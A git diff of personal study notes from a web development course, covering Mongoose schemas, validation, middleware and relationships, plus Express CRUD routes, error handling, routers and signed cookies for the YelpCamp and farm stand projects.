 <br>
-
-
-
-
 
 #### 385. Mongoose Schema Validations
 - Let's talk more about creating Mongo Schema!
@@ -6719,16 +5979,10 @@ ex. const amadeus = new Movie({title: 'Amadeus', year: 1986, score: 9.2, rating:
 - let's make a new model
   ex. touch product.js
 
-
-
-
-
-
 - **OPERATION BUFFERING**
 : allows us to use the models we defined IMMEDIATELY
   (without having to wait for Mongoose to be conencted)
   ~> we don't need to nest all the codes in mongoose.connect().then()
-
 
 - ex. const productSchema = new mongoose.Schema({
         //name: String,
@@ -6755,33 +6009,15 @@ ex. const amadeus = new Movie({title: 'Amadeus', year: 1986, score: 9.2, rating:
         console.log(err)
     })
 
-
 - if you pass in data that is not defined in the schema, the code still runs but does not store that additional information!!
 
 <br>
-
-
-
-
-
-
-
-
-
-
 
 #### 386. Additional Schema Constraints
 - schema type options
 : https://mongoosejs.com/docs/schematypes.html
 
-
 <br>
-
-
-
-
-
-
 
 #### 387. Validating Mongoose Updates
 - when you are UPDATE-ing database, you have to SPECIFICALLY TELL if you still want to apply VALIDATIONS
@@ -6789,34 +6025,18 @@ ex. const amadeus = new Movie({title: 'Amadeus', year: 1986, score: 9.2, rating:
 
 <br>
 
-
-
-
-
-
-
-
-
 #### 388. Mongoose Validation Errors
 - built-in validators ex. min, max
   : min: [6, 'Too few eggs']
   ~> the second value is the errormessage!
 
-  - there are a lot of error handling packages out there too!
+- there are a lot of error handling packages out there too!
 
-  - and commonly, validation can occur on the client side even before the server attempts to save it 
-
-
-
+- and commonly, validation can occur on the client side even before the server attempts to save it 
 
 <br>
 
-
-
-
 #### 389. Model Instance Methods
-
-
 - Adding our own functions to the schema
 : very common!
 : a way of adding functions to the Model, in addition to whatever Mongoose is already providing.
@@ -6835,16 +6055,13 @@ ex. Product.find() ~> Class Method! vs. new Product().save() ~> Instance Method!
   ex. productSchema.methods.greet = function() {
           console.log("HELLO!!!")
       }
-
       => make sure that these are added BEFORE mongoose.model line!
 
 - in node,
   ex. node
-  ex. .load product.js
-
+  ex. .load product.js,
   ex. const p = new Product({name: 'bike bag', price:10})
   ex. p.greet()
-
 
 - ex. const findProduct = async() => {
         const foundProduct = await Product.findOne({name: 'Bike Helmet'})
@@ -6858,7 +6075,6 @@ ex. Product.find() ~> Class Method! vs. new Product().save() ~> Instance Method!
             foundProduct.onSale = !foundProduct.onSale
             foundProduct.save()
         }
-
         // toggle the onSale property
 
 : ex. productSchema.methods.toggleOnSale = function () {
@@ -6872,7 +6088,6 @@ ex. Product.find() ~> Class Method! vs. new Product().save() ~> Instance Method!
             console.log(foundProduct); 
       }
 
-
 - productSchema.methods.addCategory = function (newCat) {
     this.categories.push(newCat);
     return this.save()
@@ -6883,10 +6098,6 @@ ex. Product.find() ~> Class Method! vs. new Product().save() ~> Instance Method!
 
 <br>
 
-
-
-
-
 #### 390. Adding Model Static Methods
 - not applicable to "instances"
 - "this" means different thing
@@ -6896,10 +6107,7 @@ ex. Product.find() ~> Class Method! vs. new Product().save() ~> Instance Method!
             return this.updateMany({},  {onSale: true, price: 5})
       }
 
-
-
 - ex. Product.fireSale().then(res => console.log(res))
-
 
 - **SO TO RE-ITERATE..!!**
 : STATIC methods on the MODEL ~> often have to do with fancy ways of finding things, updating things, creating things, and deleting things
@@ -6907,11 +6115,7 @@ ex. Product.find() ~> Class Method! vs. new Product().save() ~> Instance Method!
 
 : INSTANCE methods operate on individual instances of model, ex. addCategory and toggleOnSale for INDIVIDUAL product
 
-
 <br>
-
-
-
 
 #### 391. Mongoose Virtuals
 - Mongoose virtuals give us ability to add features to the schema, which don't actually exist in the db itself, but we can access to via Mongoose
@@ -6957,23 +6161,11 @@ ex. Product.find() ~> Class Method! vs. new Product().save() ~> Instance Method!
               this.name.last = v.substr(v.indexOf(' ') +1);
         })
 
-
-  <br>
-
-
-
-
-
-
-
-
-
-
+<br>
 
 #### 392. Defining Mongoose Middleware
 - this could easily be at least an hour of content
 - mongoosejs.com/docs/middleware.html ~> Middleware (also called pre and post *hooks*) are functions which are passed control during execution of asynchronous functions. Middleware is specified on the schema level and is useful for writing plugins.
-
 
 - Pre middleware functions are executed one after another, when each middleware calls next.
 : ex. const schema = new Schema(...);
@@ -6992,41 +6184,16 @@ ex. Product.find() ~> Class Method! vs. new Product().save() ~> Instance Method!
           console.log("JUST SAVED!!!")
       })
 
-    
-
-
-
-
-
 - ex. const k = new Person({first: 'Kristen', last: 'Sun'})
   ex. k.save()
   ~> Promise {<pending>}
   ~> ABOUT TO SAVE!!!
   ~> JUST SAVED!!!
 
-
-
-
-
-
 - could be useful if you wanna run something before or after a method
-
-
 - for example, for a review model, you can reflect the new review to the average reviews using post  
 
 <br>
-
-
-
-
-
-
-
-
-
-
-
-
 
 ## 38. Putting It All Together: Mongoose With Express
 #### 393. What Matters In This Section
@@ -7037,35 +6204,26 @@ ex. Product.find() ~> Class Method! vs. new Product().save() ~> Instance Method!
 : Product Details
 : Creating Products
 : Updating Products
-
 : Deleting Products
+
 - Nice To Have 
 : Filtering By Category
 
-
 <br>
 
-
-
-
 #### 394. Express + Mongoose Basic Setup
-
 - new empty folder!
 - ex. npm init -y
   ex. npm i express ejs mongoose
-
   ex. touch index.js
   ex. mkdir views
-  
   ex. nodemon index.js
 
 ~> note that MONGO D has to be running on the background!!
 
 <br>
 
-
 #### 395. Creating Our Model
-
 - GOAL: to have the full CRUD application with user interface and so on, which is connected to MongoDB
 ~> Farm App!
 
@@ -7091,7 +6249,7 @@ ex. Product.find() ~> Class Method! vs. new Product().save() ~> Instance Method!
 - in seeds.js,
   : we require mongoose
   : we require Model
-  : we connect to mongooset
+  : we connect to mongoose
 
   ~> web app / server / express not invovled!
   ~> this is the file we will run on its own anytime we want to get some new data in our database
@@ -7100,19 +6258,14 @@ ex. Product.find() ~> Class Method! vs. new Product().save() ~> Instance Method!
 
 - ex. node seeds.js
 
-
-
 <br>
-
-
-
 
 #### 396. Products Index
 - Recall. RESTful convetion (just one pattern)recommended
-  => '/proudcts' 
+  => '/products' 
 
 - ex. app.get('/products', async (req, res) => {
-          const _products_ = await Product.find({})
+          const products = await Product.find({})
           
           console.log(products)
           res.send('ALL PRODUCTS WILL BE HERE!')
@@ -7121,40 +6274,28 @@ ex. Product.find() ~> Class Method! vs. new Product().save() ~> Instance Method!
 
 <br>
 
-
-
-
-
 #### 397. Product Details
 - show.ejs
 
 <br>
 
-
 #### 398. Creating Products
 - we need a form & a route to submit the form to
-
 - the form
   : app.get('/products/new', (req, res) => {
         res.render('products/new')
-    })
-  
+    }) 
 - the route
   : app.post('/products', async (req, res) => {
         const newProduct = new Product(req.body);
         await newProduct.save();
         res.redirect(`/products/${newProduct._id}`)
     })
-
-
 - even when restarted, the newly added data are still  there!!!
 
 <br>
 
-
-
 #### 399. Updating Products
-
 - app.get('/products/:id/edit', async (req, res) => {
         const product = await Product.findById(id)
         res.render('products/edit', {product})
@@ -7170,16 +6311,9 @@ ex. Product.find() ~> Class Method! vs. new Product().save() ~> Instance Method!
 
 - ex. Product.findByIdAndUpdate() ~> refer to the doc! (validation especially)
 
-
 <br>
 
-
-
-
-
-
 #### 400. Tangent On Category Selector
-
 - Edit form to correctly show the category as the default option!
 
 - add logic to each option...
@@ -7196,10 +6330,7 @@ ex. Product.find() ~> Class Method! vs. new Product().save() ~> Instance Method!
 
   : and then iterate over these categories and make an option for each one
 
-
 <br>
-
-
 
 #### 401. Deleeting Products
 - app.delete('/products/:id, async (req, res) => {
@@ -7211,28 +6342,12 @@ ex. Product.find() ~> Class Method! vs. new Product().save() ~> Instance Method!
 
 <br>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 #### 402. BONUS: Filtering By Category
 - how to construct urls?
 : several options
 : ex. /categories/dairy
   ex. /products?category=dairy => looks better!
   
-
 - show.ejs
 
 - index.js
@@ -7248,17 +6363,7 @@ ex. Product.find() ~> Class Method! vs. new Product().save() ~> Instance Method!
         }
     });
 
-
 <br>
-
-
-
-
-
-
-
-
-
 
 ## 39. YelpCamp: Campgrounds CRUD
 #### 403. Introducing YelpCamp: Our Massive Project
@@ -7266,37 +6371,20 @@ ex. Product.find() ~> Class Method! vs. new Product().save() ~> Instance Method!
 
 <br>
 
-
-
-
 #### 404. How To Access YelpCamp Code
 - Resources & Codes for Each Section
 - Github -  downlod or look ON it
 
 <br>
 
-
-
-
 #### 405. Creating the Basic Express App
 - make a folder 'YelpCamp'
-
-
-
-
-
-
 - ex. npm init -y ~> package.json created
   ex. npm i express mongoose ejs
   ex. touch app.js
-
 - make views directory
 
 <br>
-
-
-
-
 
 #### 406. Campground Model Basics
 - let's make a folder 'models'
@@ -7311,26 +6399,20 @@ ex. Product.find() ~> Class Method! vs. new Product().save() ~> Instance Method!
           description: String,
           location: String
       });
-
       module.exports = mongoose.model('Campground', CampgroundSchema);
 
 - in app.js,
   ex. const mongoose = require('mongoose');
-
-  ex. mongoose.connect('mongodb://localhost:27017/yelpcamp', {
-    
-    
+  ex. mongoose.connect('mongodb://localhost:27017/yelpcamp', { 
         //options to pass in!
         useNewUrlParser: true,
         useCreateIndex: true,
         useUnifiedTopology: true
       });
-
   ex. const db = mongoose.connection;
   ex. db.on(~~~)
 
-
--  inmongo,
+-  in mongo,
   ex. use yelp-camp
   ex. db.campgrounds.find()
   ~> now can see the data
@@ -7341,20 +6423,7 @@ ex. Product.find() ~> Class Method! vs. new Product().save() ~> Instance Method!
 
 <br>
 
-
-
-
-
-
-
 #### 407. Seeding Campgrounds
-
-
-
-
-
-
-
 - https://github.com/Colt/YelpCamp/blob/c12b6ca9576b48b579bc304f701ebb71d6f9879a/seeds/cities.js
 
 - let's make some fake campgrounds to seed the database
@@ -7401,7 +6470,6 @@ ex. const seedDB = async () => {
 })
 
 <br>
-
 
 #### 408. Campground Index
 
@@ -7554,7 +6622,6 @@ ex. app.delete('/campgrounds/:id',async(req,res)=>{
 
 <br>
 
-
 #### 414. Intro to EXPRESS Middleware!
 - Express Middleware
 : Express middleware are func's that run during the request / response  lifecycle.
@@ -7584,17 +6651,11 @@ ex. app.delete('/campgrounds/:id',async(req,res)=>{
 
 <br>
 
-
-
-
-
 #### 415. Using Morgan - Logger Middleware
 - https://github.com/expressjs/morgan
 
 - an external middleware!
 : HTTP request logger middleware for node.js
-
-
 => very useful when debugging stuff
 => lots of ppl like it when developing an app
 
@@ -7617,9 +6678,6 @@ ex. app.use(() => {})
 
 <br>
 
-
-
-
 #### 416. Defining Our Own Middleware
 - now let's define our very first simple middleware
 
@@ -7637,16 +6695,11 @@ ex. app.use(() => {})
 
 <br>
 
-
-
-
-
 #### 417. More Middleware Practice
 - morgan: just a logger
 - and by having middlewares after that,
 - we can access the requests and handle (take/add/edit) data
 - BEFORE we reach the route handler
-
 
 - ex. in middleware, we can see if the request has an authentication token to see if it's a valid request
 
@@ -7660,7 +6713,6 @@ ex. app.use(() => {})
             res.send(responseText)
        });
 
-
 - ex. app.use((req, res, next)=>{
           req.requestTime = Date.now() // --- (A)
           console.log(req.method.toUpperCase(), req.path);
@@ -7672,10 +6724,6 @@ ex. app.use(() => {})
 - The order of the codes matters!!!
 
 <br>
-
-
-
-
 
 #### 418. Setting Up a 404 Route
 - more on app.use and how we can use it!
@@ -7694,10 +6742,7 @@ ex. app.use((req, res) => {
         res.status(404).send('NOT FOUND')
     });
 
-
-
 <br>
-
 
 #### 419. Password Middleware Demo (NOT REAL AUTH)
 - ex. app.use((req, res, next) => {
@@ -7708,13 +6753,9 @@ ex. app.use((req, res) => {
           res.send('SORRY YOU NEED A PASSWORD!!')
       });
 
-
-  <br>
-
+<br>
 
 #### 420. Protecting Specific Routes!
-
-
 - instead of using 'app.use', we can use 'app.get'!
 - app.get()
 ~> can get multiple callbacks which can work like middlewares
@@ -7730,14 +6771,7 @@ ex. app.get('/secret',verifyPassword, (req, res) => {
         res.send('MY SECRET IS: Sometimes I wear headphones in public so that I do not have to talk to anyone!')
     })
 
-
-
-
-
-
 <br>
-
-
 
 ## 41. YelpCamp: Adding Basic Styles
 #### 421. A New EJS Tool For Layouts
@@ -7945,12 +6979,10 @@ ex. <div class =  "card mb-3">
 : Express' Built-in Error Handler
 : Working With Mongoose Errors
 
-<Br>
-
+<br>
 
 #### 431. Express' Built-in Error Handler!
 - back to Middleware > index.js
-
 
 - there are so many errors that could happen! (ex. API being down, validation not met, empty password and id, etc etc)
 - also so many things that may not be in our control
@@ -7970,11 +7002,7 @@ ex. const verifyPassword = (req, res, next) => {
         throw new Error('Password Required!)
     }
 
-
 <br>
-
-
-
 
 #### 432. Defining Own Custom Error Handlers!
 - now let's move on from the built-in error handlers
@@ -7985,26 +7013,18 @@ ex. const verifyPassword = (req, res, next) => {
 ~> Define error-handling middleware fn's in the same way except those have four arguments instead of three: (err, req, res, next)
 
 - put the custom error handler at the END!
-
 ex. app.use((err, req, res, next) => {
       console.log("**error!!");
       // next(); //--- (A)
       next(err); // --- (B)
 })
 
-
 - (A): calls the next middleware
-  (B): calls the next error-handling middleare or the built-in
+  (B): calls the next error-handling middleware or the built-in
 
 - like other middlewares, if we do not call next(), the code stops there
 
-
-
-
-
-
 <br>
-
 
 #### 433. Our Custom Error Class
 - One of the strongly recommended practices with using Express, is that you define **custom error classes* to handle errors
@@ -8028,39 +7048,20 @@ ex. class AppError extends Error {
 
     module.exports = AppError;
 
-
-
-
-
 - in index.js,
 ex. const AppError = require('./AppError')
-
 ex. ... throw new AppError('password required!', 401)
 
-
 - "Error Stack"
-
 - ex. const {status = 500, message =  'something went wrong'} = err;
     res.status(status).send(message)
-
 
 - note that there are lots of templates to make the error pages pretty!
 
 - The built-in Error itself has a status code and msg
 ~> it is why we can deconstruct them
 
-
-
-
-
 <br>
-
-
-
-
-
-
-
 
 #### 434. Handling Async Errors
 - Async_Errors
@@ -8082,9 +7083,6 @@ ex. app.get('/', function (req, res, next) {
           })
     })
 
-  
-
-
 - thus, pass AppError to next()!!
 ~> again,next() looks for the next middleware, and next(sth) looks for the next error-handling middleware
 
@@ -8094,15 +7092,7 @@ ex. app.get('/', function (req, res, next) {
 
   ~> 'return' it so that the rest of the codes do not run
 
-
 <br>
-
-
-
-
-
-
-
 
 #### 435. Handling More Async  Functions!
 - there are other possible errors which are not thrown by us!
@@ -8110,16 +7100,7 @@ ex. no productname for 'new' ~> failing 'required' validation + error thrown by 
 
 ~> we usually handle this kind of errors with TRY - CATCH!!
 
-
-
-
-
-
-
-
-
-
-ex. app.post('/products', async (req, res,next) => {
+ex. app.post('/products', async (req, res, next) => {
     try{
         const newProduct = new Product(req.body);
         await newProduct.save();
@@ -8129,82 +7110,48 @@ ex. app.post('/products', async (req, res,next) => {
     }
 })
 
-
 ~> handled Mongoose Errors!
-
-
-
 
 - you gotta wrap everything inside try-catch whenever there are async functions which may possibly go wrong
 
 - and using try-catch, we don't need to return new AppError to handle the errors thrown by us
 : as those will be caught by catch (e) as well!
 
-
 <br>
-
-
-
 
 #### 436. Defining An Async Utility
 - it's annoying to write try-catch for all the async functions, which happen a lot
 
-- so define a function that we pass the entire  callback to
+- so define a function that we pass the entire callback to
 
 - 1) remove try-catch
 and 2) wrap the entire codes to another function (let. wrapAsync, catchAsync, etc.)
-
 
 - ex. function wrapAsync(fn) {
           return function (req, res, next) {
                 fn (req, res, next).catch(e =>  next(e))
           }
       }
-
   
   ~> here, fn (inside and outside) refers to the entire codes
   ~> 1) those codes are called as fn by Express
      2) it returns another function
      3) which will run those codes and catch the error if there's
 
-
-
-
-
-
 - in Express 5, errors from async functions would be automatically treated Too!
 
-<Br>
-
-
-
-
-
-
-
+<br>
 
 #### 437. Differentiation of Mongoose Errors
-
 - common thing: validation error!
 
 - note: all mongoose errors have a property called name!
-
-
-
-
 
 - let's add a new middleware which logs the name of the error
 ~> ex. app.use((err, req, res, next) => {
             console.log (err.name)
             next(err)
       })
-
-
-
-
-
-
-
 
 ~> ValidationError, CastError, And So On!
 
@@ -8220,47 +7167,12 @@ ex. const handleValidationError = err => {
 
 - a lot more to learn and apply, but this is the basic logic
 
-
 <br>
-
-
-
-
 
 ## 43. YelpCamp: Errors & Validating Data
 #### 438. Where to next with yelpcamp?
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 - client-side validation and error handler
-
 - server-side validation
-
-
-
-
-
 
 
 
@@ -8552,25 +7464,12 @@ ex. const {campgroundSchema} = require('schemas.js')
 - Nice To Have
 : SQL Relationships Overview
 
-
-
-
-
-
-
 <br>
-
-
-
-
 
 #### 447. Introduction to Mongo Relationships
 - relationships among data and Mongo!
 
 <br>
-
-
-
 
 #### 448. SQL Relationships Overview
 - "Relational Databases"
@@ -8581,21 +7480,16 @@ ex. const {campgroundSchema} = require('schemas.js')
 
 <br>
 
-
 #### 449. One to Few
-
 - So, how to implement relational database in Mongo?
-
 
 - There are SO many ways to structure database in Mongo
 ~> and what Colt is showing is just a tiny tiny bit of Mongo
 ~> takes a lot of time to really master it!!
 
-
 1. One to Few
 2. One to Many
 3. One to Gajillions
-
 
 - One To Few
 : Embed the data directly in the document!
@@ -8613,17 +7507,16 @@ ex. mkdir Models
 
 ex. touch Models/user.js
 
-~> mongoose conenction
+~> mongoose connection
 
 ~> mongoose Schema (userSchema)
 
 ~> makeUser (instance!)
 
-
 - note. _id: {id:false}
-
 => to turn off the automatic assignment of id!
 
+- One To Many
 - second, let's make a "FARM" schema!!
 ~> products: cf. MONGOOSE - POPULATE
 ~> set the type of each product element as Object ID
@@ -8632,14 +7525,12 @@ ex. touch Models/user.js
 ~> "Population is the process of automatically replacing the specified paths in the document with document(s) frm other collection(s). We may populate a single document, multiple documents, a plain object, multiple plain objects, or all objects returned from a query."
 ~> "The ref option is what tells Mongoose which model to use for population"
 
-
 - ex. const mongoose = require ('mongoose');
   ex. const {Schema} = mongoose;
   
   ex. products: [{type: Schema.Types.ObjectId, ref: 'Product'}]
 
 - by specifying 'ref', instead of typing every single object id, the population is done quickly and easily
-
 
 - makeFarm()
 ~> when you see db.farms.collections(),
@@ -8649,34 +7540,18 @@ ex. touch Models/user.js
 
 <br>
 
-
-
-
-
 #### 451. Mongoose Populate
 - this is where 'ref' comes in!
-
-
-
-
 
 - ex. Farm.findOne({name: 'Fully Belly Farms'})
     .populate('products')
     .then(farm => console.log(farm));
 
-
-
-
-
-
 <br>
-
-
 
 #### 452. One to "Bajillions"
 - One To Bajillions
-
-: With thousands or more documens it's more efficient to store a reference to the parent on the child document.
+: With thousands or more documents it's more efficient to store a reference to the parent on the child document.
 
 ex. {
         tweetText: 'adjfalkdfj',
@@ -8688,11 +7563,9 @@ ex. {
 ~> as we ususally don't need ALL the tweets at once, etc.
 
 - ex. tweet.js
-
 ~> tweets - user model
 
 - each tweet has an object id as their user!
-
 
 - now we can populate the 'user' field in 'tweet'!!
 
@@ -8702,32 +7575,18 @@ ex. {
 
 <br>
 
-
-
-
-
-
-
-
-
-
 #### 453. Mongo Schema Design
 - https://www.mongodb.com/blog/post/6-rules-of-thumb-for-mongodb-schema-design-part-3
+~> b/c  mongo provides so much freedom, sometimes it could be overwhelming to start building stuff
 
-~> VERY USEFUL!!
+~> blog post is VERY USEFUL in figuring out that!! (especially, THOSE SIX RULES))
 
 - "denormalization" : having some duplicate data
-
 ~> in SQL, almost never do it
-~> but in Mongo, if it makes sense, you can store some frequently used data as duplicates
+~> but in Mongo, if it makes sense, you can store some frequently used data as duplicates in different Schema_places!
+~> 'two-way referencing'!
 
 <br>
-
-
-
-
-
-
 
 ## 45. Mongo Relationships with Express
 #### 454. What Matters In This Section
@@ -8740,119 +7599,70 @@ ex. {
 : Creating Farms
 : Farms Show Page
 
-
 <br>
-
-
-
 
 #### 455. Defining Our Farm & Product Models
 - Thought Process
 : we don't want to embed products to farms
 : as we would want to see all the products too
-
 : and would make sense to implement the two-way relationship!
 
 <br>
 
-
-
-
-
 #### 456. Creating New Farm
-
 - db name: farmStandTake2
-
 - here, we are simplifying
 ~> but in the real world, you want to validate data & do some error handling!
 
-
 <br>
-
-
-
-
 
 #### 457. Farms Show Page!
 - similar to Products Show Page
 
 <br>
 
-
-
-
 #### 458. Creating Products For A Farm
 - for this app, let us make it possible to add a product to each farm
-
 - important: we will include the farm id inside the web route
-
-
 ex. /farms/:farm_id/products/new
+
 ex. and post the request to
 ex. /farms/:farm_id/products
-
 ~> although of course, there are other ways to implement these!
-
 ~> ex. hide the id and send it inside req.body or sth
 ~> while what we are doing is a very common practice as well
 
-
-
-
 - ex. farm.products.push(products)
-  
   ex. product.farm = farm
-
   ex. await farm.save();
-
   ex. await product.save();
 
-
-<Br>
-
-
-
-
-
-
-
-
-
+<br>
 
 #### 459. Finishing Touches
 - we should show all the products for each of the farms
-
-
-
 - in index.js,
 ex. app.get('/farms/:id',async(req,res)=>{
       const farm = await Farm.findById(req.params.id).populate('products');
       res.render('farms/show',{farm})
 });
+
 <br>
 
 #### 460. Deletion Mongoose  Middleware
-
 - ex.app.delete('/farms/:id' , async (req, res) => {
         const farm = await Farm.findByIdAndDelete(req.params.id);
         res.redirect('/farms')
 })
 
 - when deleting a farm, we want to delete its products
-
 ~> fist option: find the products with farm id and delete them
 
 ~> second option : more work upfront but nicer
 : we will choose this way
-
 : using Mongoose  Middleware!
 
 - note. in doc, we can see that .findByIdAndDelete() triggers .findOneAndDelete()
-
-
-
-
-
 
 - findOneAndDelete ~> "Query middleware": 'this' refers to the query vs. "Document middleware" this refers to the doc
 
@@ -8871,23 +7681,14 @@ ex. farmSchema.pre("findOneAndDelete", async function (data) {
 ex. farmSchema.post("findOneAndDelete", async function (data) {
         console.log(data)
 })
-
 => we can see that the POST MIDDLEWARE has access to the deleted data
-
 ex. farmSchema.post("findOneAndDelete", async function(farm) {
         const res=await Product.deleteMany({_id: {$in:  farm.products}})
-        
-
-
 })
 
-
-<Br>
-
+<br>
 
 ## 46. YelpCamp - Adding The Reviews Model
-
-
 #### 461. Defining The Review  Model
 
 - new model! with body and rating (review.js)
@@ -8941,9 +7742,3713 @@ ex. app.post('/campgrounds/:id/reviews', catchAsync(async (req, res) => {
 
 
 - recap...
+~> we put
 ~> <form novalidate...>
-~> in JS (boilerplate.ejs),
-~> all forms : ".validated-form
+~> not to validate with HTML validation!!
+
+~> but in JS (boilerplate.ejs),
+~> all forms : ".validated-form => we add this
+~> to validate with JS
+
+- Despite the fact that we did client-side validation, still some malicious attempt without valid rating or review can be posted using Postman, AJAX, etc.
+~> we do the same thing with Joi which we did for campground validation (cf. schemas.js)
+
+- in schemas.js, add reviewSchema
+
+- in app.js, require reviewSchema && set up a middleware
+ex. const {campgroundSchema,  reviewSchema} = require('./schemas.js')
+
+
+ex. const validateReview = ...
+
+- and again in app.js, add that middleware to app.post('.../reviews', validateReivew, ...)
+
+
+<br>
+
+
+#### 465. Displaying Reviews
+- in our route, we first need to **_populate_** the reviews so that they can be displayed, not in object id's anymore
+
+ex. app.get('/campgrounds/:id',....
+        
+        const campground =await Campground.findById(req.params.id).populate("reviews"));
+
+
+
+
+
+- then in show.ejs,  let's display the reviews in a pretty way!
+
+ex. <% for (let review of campground.reviews) {%>
+          <div class="mb-3">
+            <p>Rating: <%= review.rating %></p>
+            <p>Review: <%= review.body %></p>
+          </div>
+
+    <% }%>
+
+
+- if too many junk reviews,
+ex. db.reviews.deleteMany({})
+
+
+<BR>
+
+
+
+
+
+
+#### 466. Styling Reviews
+
+- with card class
+
+<br>
+
+
+#### 467. Deleting Reviews
+- new route!
+ex. app.delete('/campgrounds/:id/reviews/:reviewId' , catchAsync(async (req, res) => {
+        res.send("DELETE ME!")
+})
+
+
+// we want to delete the reference in the campground and the review itself and that is why we access both id's
+
+
+- Add the delete form for each review
+
+- to remove the review reference in the campground object, we use the mongo operator $pull!!
+
+
+~> $pull  removes from an existing array all instances of a value or values that match a specified condition
+
+ex. {$pull: {<field1>: <value|condition>, <field2>: <value|condition>,...}
+
+ex. const {id, reviewId} = req.params;
+ex. await Campground.findByIdAndUpdate(id, {$pull: {reviews: reviewId}})
+
+
+<br>
+
+
+#### 468. Campground Delete Middleware
+- mongoose middleware again!
+- ex. CampgroundSchema.post('save/clear/...')
+~> not super clear which one to use
+~> refer to the documentation!
+
+- Mongoose has 4 types of middleware
+: document middleware, query middleware, model middleware, and aggregate middleware
+
+- ex. Model.findByIdAndDelete()
+~> this function triggers findOneAndDelete()
+
+- So in campground.js,
+
+ex. CampgroundSchema.post('findOneAndDelete', async function(doc){
+      if(doc){
+          await Review.deleteMany({
+              _id: {
+                  $in: doc.reviews
+              }
+          })
+      }
+    })
+
+~> "POST-middleware" which runs after "findOneAndDelete"
+
+
+- it could be confusing b/c this "query" middleware does not have "this"keyword we can use, which other middlewares have
+
+- NOTE. if we change the way that the campground is deleted (ex. NOT .findByIdAndDelete), the  query middleware written above will not work, as 'findOneAndDelete' is not triggered
+
+<br>
+
+
+## 47. Express Router & Cookies
+#### 469. What Matters In This Section
+- Crucial!
+: Express Router Basics
+: Understanding Cookies
+: Cookie Parser
+
+- Important
+: Singed Cookied
+
+- Nice To Have
+: HMAC Signing
+
+<br>
+
+#### 470. Express Router Info
+- Express has various types of routes (post/get/put/...) we can directly put on 'app', and that's why we can have many routes in one document (ex. app.js)
+
+- however, for a large app, the file will get too long
+- so we'll use ** express.Router([options])**
+~> it creates a new router object
+
+- "A router object is an isolated instance of middleware and routes. You can think of it as a 'mini-application,' capable of performing middleware and routing functions. Every Express application has a built-in app router."
+
+~> 'mini-application' which we can combine with other routers to build a full application
+
+
+- ex. /shelter
+  ex. /shelter/new
+  ex. /shelter/:id ...
+
+  ex. /dogs
+  ex. /dogs/new
+  ex. /dogs/:id ...
+
+  ~> with router, we can 'group the routes together
+
+- RouterDemo > routes
+
+- in shelters.js,
+ex. const express= require('express');
+    const router = express.Router();
+
+    router.get('/shelters', (req, res) => {
+      res.send("shelters")
+    })
+
+    router.get('/shelters/:id', (req, res) => {
+      res.send("viewing one shelter")
+    })
+
+    router.get('/shelters/:id/edit', (res, req) => {
+      res.send("editing")
+    })
+
+    module.exports = router;
+    //created a new empty router & added three ones
+
+- and in index.js,
+ex. const shelterRoutes = require('./routes/shelters')
+
+- requiring is not enough // we gotta tell app, which is serving port 3000, to use the required router
+
+~> in the doc, "you can then use a router for a particular root url in this way separating your routes into files or even mini-apps"
+~> //only requests to "/calendar /*"will be sent to our 'router'
+~> app.use('/calendar',router)
+
+- so in index.j,s
+ex. app.use('/', shelterRoutes);
+- OR, you can do
+ex. app.use('/shelters', shelterRoutes);
+~> and remove all the 'shelters'parts in shelters.js
+
+- modifying the start routes is also easier with one spot
+
+<br>
+
+#### 471. Express Router & Middleware
+- you can set a middleware to only apply to a certain router too!
+
+ex. admin.js ~> let's see if the user is actually the admin (using a fake validation middleware)
+
+- in admin.js,
+ex. router.use((req, res, next) => {
+        if(req.query.isAdmin){ 
+          next();
+        }
+        else{
+          res.send('sorry not an admin');
+        }
+    })
+
+=> you can only apply it to that route this way
+
+=>vs. definig it as a function and passing it into individual routes! ex. app.get('/aejfkljaiolk', some_middleware, (req, res) => {...})
+
+<br>
+
+#### 472. Introducing Cookies
+- Cookies
+~> What are they??
+~> Cookies are little bits of information that are stored in a user's browser when browsing a particular website
+
+~> Once a Cookie is set, a user's browser will send the cookie on every subsequent request to the web site
+
+~> Cookies allow use to make HTTP stateful
+
+- uses of cookies : session management, personalization, tracking, etc
+
+- Chrome - developer tool - application - cookies
+~> so many data saved and sent through cookies
+
+<br>
+
+#### 473. Sending Cookies
+- express doc => res.cookie(name, value  [, options])
+~> sets cookie **name** to **value**.
+~> the  **value** parameter may be a string or object converted to JSON
+
+- in index.js,
+ex. app.get('/setname', (req, res) => {
+      res.cookie("name", "stevie chicks");
+      res.send("OK SENT YOU A COOKIE!");
+    });
+  
+~> if we reach that route, we can see in Chrome the cookie w/ name: stevie chicks
+
+~> once we reach it, even if we go to other routes the cookie is sent with the stored info
+
+<br>
+
+#### 474. Cookie Parser Middleware
+- https://www.npmjs.com/package/cookie-parser
+
+- we find cookies
+~> in req.cookies!
+
+- Express does not have a cookie parser as a built-in
+~> npm install cookie-parser
+
+- ex. const cookieParser = require('cookie-parser')
+  ex. app.use(cookieParser())
+~> now on every request, we have a property called 'req.cookies'
+
+- ex. in index.js
+  ex. app.get(...
+
+        const {name = 'default'}= req.cookies..)
+
+- remember cookies are not used to 'store' data though
+- they are for statefulness
+
+- it's the browsers that do the work
+
+<br>
+
+#### 475. Signing Cookies
+- 'Signed' cookies: kind of a digital signature, verifying the integrity of it
+
+- with 'cookie-parser' we can sign the cookies 
+
+- 'signing' is not about hiding or encrypting the data, but is about validating that the info sent is the same as the info received 
+
+- ex. app.use(cookieParser('thisismysecret')); //this string is used to sign the cookies
+
+- ex. app.get('/getsingedcookie',(req, res) => {
+        
+        res.cookie('fruit', 'grape', {signed: true})
+
+      })
+
+      //we get back sth like '%3Agrape.LMNZojp%2FiR9Tsj50P0ysA22deJjrP0awUK0S8R3lT' as the cookie and we can indeed see 'grape' in it
+      //not about hiding the info
+
+- ex. app.get('/verifyfruit', (req, res) => {
+        res.send(req.singedCookies)
+      })
+
+      //
+
+- Signed cookies are stored in a different object 'req.signedCookies'
+~> express doc!
+
+
+
+
+- after cookies are signed, even if those cookies are manually changed or sth, it is noticed and req.signedCookies return ex. {'fruit':false}
+
+- if you change the key to cookieParser(key) the previous cookies become unavailable!
+
+
+<br>
+
+
+#### 476. OPTIONAL-HMAC Signing
+
+- freeformatter.com/hmac-generator
+
+- hmac - to validate the integrity (unchanged?) and authenticity (who sent it?)
+
+<br>
+
+## 48. Express Sessions & Flash
+#### 477. What Matters In This Section
+- Crucial!
+: Conceptual Overview of Session
+: Setting Up Express Session
+
+- Important
+: Integrating Flash Messages
+
+
+<br>
+
+
